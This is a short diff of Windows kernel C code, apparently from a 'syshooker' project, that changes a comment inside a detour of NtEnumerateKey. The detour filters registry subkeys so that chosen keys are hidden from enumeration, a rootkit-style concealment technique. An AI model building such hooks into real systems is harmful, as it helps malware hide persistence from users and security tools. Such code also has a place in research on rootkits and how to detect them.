@@ -55,7 +55,7 @@ NTSTATUS DetourNtEnumerateKey(
 		//kprintf("[+] syshooker: NtEnumerateKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
 		
 		// there are keys that should be hidden. That means that we want to return
-		// the Index'th subkey of this key (OkSubkeyIndexesPtr[Index])
+		// the Index'th not-hidden subkey of this key (OkSubkeyIndexesPtr[Index])
 		if (HideSubkeyIndexesCount > 0) {
 			if (Index >= OkSubkeyIndexesCount) {
 				ExFreePool(OkSubkeyIndexesPtr); // free the buffer
